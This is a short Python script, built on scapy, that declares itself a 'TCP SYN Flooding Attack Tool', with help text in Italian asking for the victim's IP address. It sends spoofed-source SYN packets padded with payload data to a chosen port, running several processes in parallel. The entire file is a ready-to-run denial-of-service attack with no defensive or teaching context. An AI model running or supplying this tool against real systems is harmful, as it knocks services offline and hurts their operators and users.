from scapy.all import *
from scapy.layers.inet import IP, TCP
from multiprocessing import Process, cpu_count
import os
import argparse
from argparse import RawTextHelpFormatter

parser = argparse.ArgumentParser(description='TCP SYN Flooding Attack Tool', formatter_class=RawTextHelpFormatter)

parser.add_argument('--numPACK', type=int, dest='numPACK', action='store', default=10000, help='Numero di pacchetti da inviare. [Default 10000]')
parser.add_argument('--dstPORT', type=float, dest='dstPORT', action='store', default=80, help='Numero di porta. [Default: 80]')  

#required arguments
requiredNamed = parser.add_argument_group('Argomenti obbligatori.')
requiredNamed.add_argument('--dstIP', type=str, dest='dstIP', action='store', help='Inserire l\'indirizzo IP della vittima.')        

args = parser.parse_args()
print("Argomenti: " + str(args))

def synFlooding(numPACK, dstIP, dstPORT):
    for i in range(numPACK):
        packet = IP(src=str(RandIP()), dst=dstIP) / TCP(dport=dstPORT, flags="S") / Raw(b"X"*1024)
        send(packet, verbose=0)

def main():
    # thread List
    process = []  
    
    # adjust number of packets per thread
    numPACK = int(args.numPACK / (cpu_count() -1))
    if numPACK == 0:
        numPACK = 1
    
    for e in range(cpu_count() -1):
        proc = Process(target=synFlooding, args=(int(numPACK), str(args.dstIP), int(args.dstPORT)))
        process.append(proc)
        proc.start()
        print("[+] Thread {}: PID: {}".format(e, os.getpid()))

    for p in process:
        p.join()


if __name__ == '__main__':
    if args.dstIP == None:
        parser.print_help()
        exit()
    print('[*] Starting TCP SYN Flooding Attack', 'orange')
    main()